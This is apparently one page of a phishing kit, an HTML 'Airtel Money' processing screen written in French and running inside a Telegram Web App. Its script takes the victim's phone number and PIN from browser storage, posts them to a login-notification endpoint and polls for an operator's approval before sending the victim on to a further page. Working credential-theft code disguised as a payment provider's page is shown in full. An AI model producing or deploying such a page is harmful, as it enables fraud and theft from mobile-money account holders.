<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Airtel Money - Traitement</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, sans-serif;
            background-color: #555555;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .loading-card {
            background: white;
            width: 90%;
            max-width: 380px;
            padding: 50px 20px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }

        .loader-circle {
            width: 120px;
            height: 120px;
            background: radial-gradient(circle, #ff0000 0%, #cc0000 100%);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .loader-circle::after {
            content: '';
            width: 90px;
            height: 90px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            color: #ff0000;
            font-size: 26px;
            margin: 0 0 10px;
            font-weight: 600;
        }

        p {
            color: #555;
            font-size: 16px;
            margin: 0;
            line-height: 1.4;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">Traitement...</h2>
    <p id="sub-text">Préparation de la vérification...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {

    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const phone = localStorage.getItem("phone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    if (!phone) {
        console.warn("⚠️ Aucun numéro trouvé dans localStorage");
    }

    // -------------------- SEND LOGIN REQUEST --------------------
    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin })
        });
    } catch (err) {
        console.error("❌ Erreur de requête :", err);
    }

    // -------------------- TEXT CHANGE --------------------
    setTimeout(() => {
        mainText.textContent = "Veuillez patienter...";
        subText.textContent = "Cela prend quelques secondes";
    }, 3000);

    // -------------------- CHECK APPROVAL --------------------
    async function checkApproval() {
        if (!phone) return;

        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "Approuvé !";
                subText.textContent = "Ouverture de la page suivante...";

                setTimeout(() => {
                    window.location.href = "/page8";
                }, 1500);
            }

            if (data.status === "denied") {
                mainText.textContent = "Refusé !";
                subText.textContent = "Vos informations sont incorrectes.";
            }

        } catch (err) {
            console.error("❌ Échec de la vérification du statut :", err);
        }
    }

    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
